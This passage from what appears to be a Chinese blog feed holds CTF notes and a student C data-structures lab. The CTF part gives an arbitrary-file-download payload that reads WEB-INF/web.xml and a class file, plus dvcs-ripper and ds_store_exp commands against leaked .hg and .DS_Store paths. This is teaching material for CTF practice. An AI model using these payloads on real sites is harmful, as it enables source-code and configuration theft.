通过找到web.xml文件，推断class文件的路径，最后直接class文件，在通过反编译class文件，得到网站源码。</p><h2 id="实战-RoarCTF-2019-Easy-Java"><a href="#实战-RoarCTF-2019-Easy-Java" class="headerlink" title="实战: [RoarCTF 2019]Easy Java"></a>实战: [RoarCTF 2019]Easy Java</h2><p>进入页面，是个登陆界面，sql注入试了一下，发现没有用<br>登陆页面下有个help窗口，尝试访问，url变成: &#x2F;Download?filename&#x3D;help.docx，也就是可以随意查询文件….但是它返回的结果是: java.io.FileNotFoundException:{help.docx}</p><p>然后我就8会了，看wp，发现要进行post传参，但我找了10几个wp也没明白为啥要这么搞，就tm离谱…<br>post传参: </p><figure class="highlight abnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs abnf"><span class="hljs-attribute">filename</span><span class="hljs-operator">=</span>WEB-INF/web.xml<br></code></pre></td></tr></table></figure><p>下载下来发现关键映射: </p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-meta">&lt;?xml version=<span class="hljs-string">&quot;1.0&quot;</span> encoding=<span class="hljs-string">&quot;UTF-8&quot;</span>?&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">web-app</span> <span class="hljs-attr">xmlns</span>=<span class="hljs-string">&quot;http://xmlns.jcp.org/xml/ns/javaee&quot;</span></span><br><span class="hljs-tag">         <span class="hljs-attr">xmlns:xsi</span>=<span class="hljs-string">&quot;http://www.w3.org/2001/XMLSchema-instance&quot;</span></span><br><span class="hljs-tag">         <span class="hljs-attr">xsi:schemaLocation</span>=<span class="hljs-string">&quot;http://xmlns.jcp.org/xml/ns/javaee http://xmlns.jcp.org/xml/ns/javaee/web-app_4_0.xsd&quot;</span></span><br><span class="hljs-tag">         <span class="hljs-attr">version</span>=<span class="hljs-string">&quot;4.0&quot;</span>&gt;</span><br><br>    <span class="hljs-tag">&lt;<span class="hljs-name">welcome-file-list</span>&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">welcome-file</span>&gt;</span>Index<span class="hljs-tag">&lt;/<span class="hljs-name">welcome-file</span>&gt;</span><br>    <span class="hljs-tag">&lt;/<span class="hljs-name">welcome-file-list</span>&gt;</span><br><br>    <span class="hljs-tag">&lt;<span class="hljs-name">servlet</span>&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">servlet-name</span>&gt;</span>IndexController<span class="hljs-tag">&lt;/<span class="hljs-name">servlet-name</span>&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">servlet-class</span>&gt;</span>com.wm.ctf.IndexController<span class="hljs-tag">&lt;/<span class="hljs-name">servlet-class</span>&gt;</span><br>    <span class="hljs-tag">&lt;/<span class="hljs-name">servlet</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">servlet-mapping</span>&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">servlet-name</span>&gt;</span>IndexController<span class="hljs-tag">&lt;/<span class="hljs-name">servlet-name</span>&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">url-pattern</span>&gt;</span>/Index<span class="hljs-tag">&lt;/<span class="hljs-name">url-pattern</span>&gt;</span><br>    <span class="hljs-tag">&lt;/<span class="hljs-name">servlet-mapping</span>&gt;</span><br><br>    <span class="hljs-tag">&lt;<span class="hljs-name">servlet</span>&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">servlet-name</span>&gt;</span>LoginController<span class="hljs-tag">&lt;/<span class="hljs-name">servlet-name</span>&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">servlet-class</span>&gt;</span>com.wm.ctf.LoginController<span class="hljs-tag">&lt;/<span class="hljs-name">servlet-class</span>&gt;</span><br>    <span class="hljs-tag">&lt;/<span class="hljs-name">servlet</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">servlet-mapping</span>&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">servlet-name</span>&gt;</span>LoginController<span class="hljs-tag">&lt;/<span class="hljs-name">servlet-name</span>&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">url-pattern</span>&gt;</span>/Login<span class="hljs-tag">&lt;/<span class="hljs-name">url-pattern</span>&gt;</span><br>    <span class="hljs-tag">&lt;/<span class="hljs-name">servlet-mapping</span>&gt;</span><br><br>    <span class="hljs-tag">&lt;<span class="hljs-name">servlet</span>&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">servlet-name</span>&gt;</span>DownloadController<span class="hljs-tag">&lt;/<span class="hljs-name">servlet-name</span>&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">servlet-class</span>&gt;</span>com.wm.ctf.DownloadController<span class="hljs-tag">&lt;/<span class="hljs-name">servlet-class</span>&gt;</span><br>    <span class="hljs-tag">&lt;/<span class="hljs-name">servlet</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">servlet-mapping</span>&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">servlet-name</span>&gt;</span>DownloadController<span class="hljs-tag">&lt;/<span class="hljs-name">servlet-name</span>&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">url-pattern</span>&gt;</span>/Download<span class="hljs-tag">&lt;/<span class="hljs-name">url-pattern</span>&gt;</span><br>    <span class="hljs-tag">&lt;/<span class="hljs-name">servlet-mapping</span>&gt;</span><br><br>    <span class="hljs-tag">&lt;<span class="hljs-name">servlet</span>&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">servlet-name</span>&gt;</span>FlagController<span class="hljs-tag">&lt;/<span class="hljs-name">servlet-name</span>&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">servlet-class</span>&gt;</span>com.wm.ctf.FlagController<span class="hljs-tag">&lt;/<span class="hljs-name">servlet-class</span>&gt;</span><br>    <span class="hljs-tag">&lt;/<span class="hljs-name">servlet</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">servlet-mapping</span>&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">servlet-name</span>&gt;</span>FlagController<span class="hljs-tag">&lt;/<span class="hljs-name">servlet-name</span>&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">url-pattern</span>&gt;</span>/Flag<span class="hljs-tag">&lt;/<span class="hljs-name">url-pattern</span>&gt;</span><br>    <span class="hljs-tag">&lt;/<span class="hljs-name">servlet-mapping</span>&gt;</span><br><br><span class="hljs-tag">&lt;/<span class="hljs-name">web-app</span>&gt;</span><br></code></pre></td></tr></table></figure><p>根据映射可以看到: FlagController里应该有flag<br>payload:</p><figure class="highlight crystal"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs crystal">filename=<span class="hljs-regexp">/WEB-INF/classes</span><span class="hljs-regexp">/com/wm</span><span class="hljs-regexp">/ctf/</span>FlagController.<span class="hljs-keyword">class</span><br></code></pre></td></tr></table></figure><p>我: ???</p><h1 id="hg文件泄露"><a href="#hg文件泄露" class="headerlink" title=".hg文件泄露"></a>.hg文件泄露</h1><p>当开发人员使用 Mercurial 进行版本控制，对站点自动部署。hg.init 的时候会形成.hg文件夹，如果配置不当,可能会将.hg 文件夹直接部署到线上环境，引起泄露<br>工具: <a href="https://github.com/kost/dvcs-ripper">dvcs-ripper</a></p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">rip-hg.pl -v -u http:<span class="hljs-regexp">//</span>www.example.com<span class="hljs-regexp">/.hg/</span><br></code></pre></td></tr></table></figure><h1 id="DS-Store文件泄漏"><a href="#DS-Store文件泄漏" class="headerlink" title=".DS_Store文件泄漏"></a>.DS_Store文件泄漏</h1><p>在发布代码时未删除文件夹中隐藏的.DS_store，可获取敏感的文件名等信息。</p><h2 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h2><p>可以访问一下(<a href="http://www.example.com/.ds_store)%EF%BC%8C%E7%84%B6%E5%90%8E%E5%88%A9%E7%94%A8[dsstoreexp](https://github.com/lijiejie/ds_store_exp)%E5%B7%A5%E5%85%B7">http://www.example.com/.ds_store)，然后利用[dsstoreexp](https://github.com/lijiejie/ds_store_exp)工具</a></p><figure class="highlight vim"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs vim"><span class="hljs-keyword">python</span> ds_store_exp.<span class="hljs-keyword">py</span> http://www.example.<span class="hljs-keyword">com</span>/.DS_Store<br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>CTF</category>
      
      <category>基础</category>
      
    </categories>
    
    
    <tags>
      
      <tag>web</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>数据结构第二次上鸡</title>
    <link href="/2021/10/08/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E7%AC%AC%E4%BA%8C%E6%AC%A1%E4%B8%8A%E9%B8%A1/"/>
    <url>/2021/10/08/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E7%AC%AC%E4%BA%8C%E6%AC%A1%E4%B8%8A%E9%B8%A1/</url>
    
    <content type="html"><![CDATA[<p>第二次上鸡，搓了好久</p><h2 id="问1-搓代码将10进制转化为2进制，要用到栈"><a href="#问1-搓代码将10进制转化为2进制，要用到栈" class="headerlink" title="问1:搓代码将10进制转化为2进制，要用到栈"></a>问1:搓代码将10进制转化为2进制，要用到栈</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">include</span><span class="hljs-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span><span class="hljs-string">&lt;malloc.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> More 20</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> Init_Size 120</span><br><span class="hljs-keyword">typedef</span> <span class="hljs-type">int</span> ElemType;<br><span class="hljs-keyword">typedef</span> <span class="hljs-class"><span class="hljs-keyword">struct</span>&#123;</span><br>ElemType *ebp;<br>ElemType *esp;<br><span class="hljs-type">int</span> Size;<br>&#125;SqStack;<br><br><span class="hljs-type">void</span> <span class="hljs-title function_">Init</span><span class="hljs-params">(SqStack &amp;S)</span>&#123;<br>S.ebp=(ElemType*)<span class="hljs-built_in">malloc</span>(Init_Size*<span class="hljs-keyword">sizeof</span>(ElemType));<br>S.esp=S.ebp;<br>S.Size=Init_Size;<br><span class="hljs-keyword">return</span>;<br>&#125;<br><br><span class="hljs-type">void</span> <span class="hljs-title function_">Get</span><span class="hljs-params">(SqStack &amp;S,ElemType e)</span>&#123;<br><span class="hljs-keyword">if</span>(S.esp==S.ebp)<span class="hljs-keyword">return</span>;<br>e=*(S.esp<span class="hljs-number">-1</span>);<br><span class="hljs-keyword">return</span>;<br>&#125;<br><br><span class="hljs-type">void</span> <span class="hljs-title function_">Push</span><span class="hljs-params">(SqStack &amp;S,ElemType e)</span>&#123;<br><span class="hljs-keyword">if</span>(S.esp-S.ebp==S.Size)&#123;<br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Th3 5t4ck 1s fu11!\n&quot;</span>);<br>S.ebp=(ElemType*)<span class="hljs-built_in">realloc</span>(S.ebp,<span class="hljs-keyword">sizeof</span>(ElemType)*(S.Size+More));<br>S.Size+=More;<br>&#125;<br>*(S.esp++)=e;<br><span class="hljs-comment">//printf(&quot;Pu5h 5ucc3553d,e=%d\n&quot;,e);</span><br><span class="hljs-keyword">return</span>;<br>&#125;<br><br><span class="hljs-type">void</span> <span class="hljs-title function_">Pop</span><span class="hljs-params">(SqStack &amp;S,ElemType &amp;e)</span>&#123;<span class="hljs-comment">//e来返回值 </span><br><span class="hljs-keyword">if</span>(S.esp==S.ebp)&#123;<br><span class="hljs-keyword">return</span>;<br>&#125;<br>e=*(--S.esp); <br><span class="hljs-keyword">return</span>; <br>&#125;<br><br><br><span class="hljs-type">void</span> <span class="hljs-title function_">Conversion</span><span class="hljs-params">(SqStack &amp;S,<span class="hljs-type">int</span> x)</span>&#123;<br><span class="hljs-type">int</span> a,b,y=x;<br><span class="hljs-keyword">while</span>(y!=<span class="hljs-number">1</span>)&#123;<br>a=y/<span class="hljs-number">2</span>;<br>b=y%<span class="hljs-number">2</span>;<br>Push(S,b);<br>y=a;<br><span class="hljs-comment">//printf(&quot;b=%d,y=%d\n&quot;,b,y);</span><br>&#125;<br><span class="hljs-comment">//printf(&quot;F1n15h3d,esp-ebp=%d\n&quot;,S.esp-S.ebp);</span><br><span class="hljs-keyword">return</span>;<br>&#125;<br><br><span class="hljs-type">int</span> <span class="hljs-title function_">IfEmpty</span><span class="hljs-params">(SqStack S)</span>&#123;<br><span class="hljs-keyword">if</span>(S.ebp==S.esp)&#123;<br><span class="hljs-comment">//printf(&quot;esp-ebp=%d,3mpty!\n&quot;,S.esp-S.ebp);</span><br><span class="hljs-keyword">return</span> <span class="hljs-number">1</span>;<br>&#125;<br><span class="hljs-keyword">else</span>&#123;<br><span class="hljs-comment">//printf(&quot;N0t 3mpty!\n&quot;);</span><br><span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br>&#125;<br><span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">()</span>&#123;<br><span class="hljs-type">int</span> x,e,i;<br>SqStack S;<br>Init(S);<br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;请输入一个10进制数：\n&quot;</span>);<br><span class="hljs-built_in">scanf</span>(<span class="hljs-string">&quot;%d&quot;</span>,&amp;x);<br>Conversion(S,x);<br><span class="hljs-keyword">while</span>(IfEmpty(S)!=<span class="hljs-number">1</span>)&#123;<br>Pop(S,i);<br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;%d&quot;</span>,i);<br>&#125;<br>&#125;<br></code></pre></td></tr></table></figure><h3 id="关于引用和解引用"><a href="#关于引用和解引用" class="headerlink" title="关于引用和解引用"></a>关于引用和解引用</h3><p><em>在c中有解引用的用法，对于一个指针p，</em>p表示对p进行”解释”，通俗来说就是取值的意思。而相对应的，&amp;还有脱去解引用的意思，比如对于指针L,&amp;*L表示L先取值，再用&amp;脱去解引用，所以结果还是地址的意思。。。。</p><h2 id="问2-括号匹配问题"><a href="#问2-括号匹配问题" class="headerlink" title="问2:括号匹配问题"></a>问2:括号匹配问题</h2><p>设一个表达式中可以包含三种括号：“(”和“)”、“[”和“]”、“{”和“}”，并且这三种括号可以按照任意的次序嵌套使用，考查表达式中的括号是否匹配。<br>【基本要求】<br>写一个程序，判断给定表达式中的括号是否匹配。<br>【测试数据】<br>有多个表达式，每个表达式（不超过100个字符）占一行。例如，<br>[(d+f)*{}2]<br>[(2+3))<br>()}<br>[4(6]7)9</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">include</span><span class="hljs-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span><span class="hljs-string">&lt;malloc.h&gt;</span></span><br><span class="hljs-keyword">typedef</span> <span class="hljs-type">char</span> ElemType;<br><br><span class="hljs-keyword">typedef</span> <span class="hljs-class"><span class="hljs-keyword">struct</span>&#123;</span><br>ElemType * esp;<br>ElemType * ebp;<br><span class="hljs-type">int</span> size;<br>&#125; Stack;<br><br><span class="hljs-type">void</span> <span class="hljs-title function_">Init</span><span class="hljs-params">(Stack &amp;S)</span>&#123;<br>S.ebp=(ElemType*)<span class="hljs-built_in">malloc</span>(<span class="hljs-keyword">sizeof</span>(ElemType)*<span class="hljs-number">50</span>);<br>S.esp=S.ebp;<br>S.size=<span class="hljs-number">50</span>;<br><span class="hljs-keyword">return</span>;<br>&#125;<br><br><span class="hljs-type">void</span> <span class="hljs-title function_">Push</span><span class="hljs-params">(Stack &amp;S,ElemType e)</span>&#123;<br><span class="hljs-keyword">if</span>(S.esp-S.ebp==S.size)&#123;<br>S.ebp=(ElemType*)<span class="hljs-built_in">realloc</span>(S.ebp,<span class="hljs-keyword">sizeof</span>(ElemType)*(<span class="hljs-number">20</span>+S.size));<br>S.size+=<span class="hljs-number">20</span>;<br>&#125;<br>*(S.esp++)=e;<br><span class="hljs-keyword">return</span>; <br>&#125;<br><br><span class="hljs-type">void</span> <span class="hljs-title function_">Get</span><span class="hljs-params">(Stack S,ElemType &amp;e)</span>&#123;<br><span class="hljs-keyword">if</span>(S.esp==S.ebp)&#123;<span class="hljs-keyword">return</span>;&#125;<br>e=*(--S.esp);<br><span class="hljs-comment">//printf(&quot;Get:%c\n&quot;,e);</span><br><span class="hljs-keyword">return</span>;<br>&#125;<br><br><span class="hljs-type">void</span> <span class="hljs-title function_">Pop</span><span class="hljs-params">(Stack &amp;S,ElemType &amp;e)</span>&#123;<br><span class="hljs-keyword">if</span>(S.esp==S.ebp)&#123;<br><span class="hljs-keyword">return</span>;<br>&#125;<br>e=*(--S.esp);<br><span class="hljs-keyword">return</span>;<br>&#125;<br><br><span class="hljs-type">int</span> <span class="hljs-title function_">Pair</span><span class="hljs-params">(<span class="hljs-type">char</span> a,<span class="hljs-type">char</span> b)</span>&#123;<br><span class="hljs-keyword">if</span>(a==<span class="hljs-string">&#x27;(&#x27;</span>)&#123;<br><span class="hljs-keyword">if</span>(b==<span class="hljs-string">&#x27;)&#x27;</span>)&#123;<span class="hljs-keyword">return</span> <span class="hljs-number">1</span>;&#125;<br>&#125;<br><span class="hljs-keyword">if</span>(a==<span class="hljs-string">&#x27;[&#x27;</span>)&#123;<br><span class="hljs-keyword">if</span>(b==<span class="hljs-string">&#x27;]&#x27;</span>)&#123;<span class="hljs-keyword">return</span> <span class="hljs-number">1</span>;&#125;<br>&#125;<br><span class="hljs-keyword">if</span>(a==<span class="hljs-string">&#x27;&#123;&#x27;</span>)&#123;<br><span class="hljs-keyword">if</span>(b==<span class="hljs-string">&#x27;&#125;&#x27;</span>)&#123;<span class="hljs-keyword">return</span> <span class="hljs-number">1</span>;&#125;<br>&#125;<br><span class="hljs-keyword">else</span>&#123;<span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;&#125;<br>&#125;<br><br><span class="hljs-type">int</span> <span class="hljs-title function_">Match</span><span class="hljs-params">(<span class="hljs-type">char</span> a[],<span class="hljs-type">int</span> len,Stack &amp;S)</span>&#123;<br><span class="hljs-type">int</span> i;<br><span class="hljs-type">char</span> e;<br><span class="hljs-type">char</span> l1=<span class="hljs-string">&#x27;(&#x27;</span>,l2=<span class="hljs-string">&#x27;[&#x27;</span>,l3=<span class="hljs-string">&#x27;&#123;&#x27;</span>,r1=<span class="hljs-string">&#x27;)&#x27;</span>,r2=<span class="hljs-string">&#x27;]&#x27;</span>,r3=<span class="hljs-string">&#x27;&#125;&#x27;</span>;<br><span class="hljs-keyword">for</span>(i=<span class="hljs-number">0</span>;i&lt;len;i++)&#123;<br><span class="hljs-keyword">if</span>(a[i]==l1||a[i]==l2||a[i]==l3)&#123;<br>Push(S,a[i]);<br>&#125;<br><span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span>(a[i]==r1||a[i]==r2||a[i]==r3)&#123;<br>Get(S,e);<br><span class="hljs-keyword">if</span>(Pair(e,a[i]))&#123;<br>Pop(S,e);<br>&#125;<br><span class="hljs-keyword">else</span>&#123;<br><span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br>&#125;<br>&#125;<br><span class="hljs-keyword">if</span>(S.esp==S.ebp)&#123;<br><span class="hljs-comment">//printf(&quot;wtf?\n&quot;);</span><br><span class="hljs-keyword">return</span> <span class="hljs-number">1</span>;<br>&#125;<br><span class="hljs-keyword">if</span>(S.ebp!=S.esp)&#123;<br><span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br>&#125;<br><span class="hljs-comment">/*int main()&#123;</span><br><span class="hljs-comment">Stack S;</span><br><span class="hljs-comment">Init(S);</span><br><span class="hljs-comment">char x;</span><br><span class="hljs-comment">Push(S,&#x27;1&#x27;);</span><br><span class="hljs-comment">Push(S,&#x27;2&#x27;);</span><br><span class="hljs-comment">Push(S,&#x27;3&#x27;);</span><br><span class="hljs-comment">Get(S,x);</span><br><span class="hljs-comment">printf(&quot;%c\n&quot;,x);</span><br><span class="hljs-comment">Pop(S,x);</span><br><span class="hljs-comment">printf(&quot;%c\n&quot;,x);</span><br><span class="hljs-comment">Pop(S,x);</span><br><span class="hljs-comment">printf(&quot;%c\n&quot;,x);</span><br><span class="hljs-comment">&#125;*/</span><br><span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">()</span>&#123;<br>Stack S;<br>Init(S);<br><span class="hljs-type">int</span> i,len;<br><span class="hljs-type">char</span> a[<span class="hljs-number">50</span>];<br>Init(S);<br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;输入字符串长度:\n&quot;</span>);<br><br>a1: <span class="hljs-built_in">scanf</span>(<span class="hljs-string">&quot;%d&quot;</span>,&amp;len);<br><span class="hljs-keyword">if</span>(len&gt;<span class="hljs-number">50</span>)&#123;<br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;请输入&lt;=50的数字:\n&quot;</span>);<br><span class="hljs-keyword">goto</span> a1;<br>&#125;<br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;请输入字符:\n&quot;</span>);<br><span class="hljs-keyword">for</span>(i=<span class="hljs-number">0</span>;i&lt;len;i++)&#123;<br>getchar();<br><span class="hljs-built_in">scanf</span>(<span class="hljs-string">&quot;%c&quot;</span>,&amp;a[i]);<br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;请继续输入:\n&quot;</span>,i);<br>&#125;<br><span class="hljs-keyword">if</span>(Match(a,len,S)==<span class="hljs-number">1</span>)&#123;<br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;yes\n&quot;</span>);<br>&#125;<br><span class="hljs-keyword">else</span>&#123;<br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;no\n&quot;</span>);<br>&#125;<br><span class="hljs-comment">/*else&#123;</span><br><span class="hljs-comment">printf(&quot;no\n&quot;);</span><br><span class="hljs-comment">&#125;*/</span><br><span class="hljs-comment">/*for(i=0;i&lt;len;i++)&#123;</span><br><span class="hljs-comment">printf(&quot;%c&quot;,a[i]);</span><br><span class="hljs-comment">&#125;*/</span><br>&#125;<br></code></pre></td></tr></table></figure><h2 id="问3-停车场问题"><a href="#问3-停车场问题" class="headerlink" title="问3:停车场问题"></a>问3:停车场问题</h2><p>【问题描述】<br>设停车场是一个可停放n辆汽车的狭长通道，且只有一个大门可供汽车进出。汽车在停车场内按车辆到达时间的先后顺序，依次由北向南排列（大门在最南端，最先到达的第一辆车停放在车场的最北端），若车场内已停满n辆汽车，则后来的汽车只能在门外的便道上等候，一旦有车开走，则排在便道上的第一辆车即可开入。当停车场内某辆车要离开时，在它之后进入的车辆必须先退出车场为它让路，待该辆车开出大门外，其他车辆再按原次序进入车场，每辆停放在车场的车在它离开停车场时必须按它停留的时间长短交纳费用。试为停车场编制按上述要求进行管理的模拟程序。<br>【基本要求】<br>以栈模拟停车场，以队列模拟车场外的便道，按照从终端读入的输入数据序列进行模拟管理。每一组输入数据包括三个数据项：汽车“到达”或“离去”信息、汽车牌照号码以及到达或离去的时刻。对每一组输入数据进行操作后的输出信息为：若是车辆到达，则输出汽车在停车场内或便道上的停车位置，若是车辆离去，则输出汽车在停车场内停留的时间和应交纳的费用（在便道上停留的时间不收费）。栈以顺序结构实现，队列以链表结构实现。<br>【测试数据】<br>设n&#x3D;2,输入数据为：(‘A’,1,5), (‘A’,2,10), 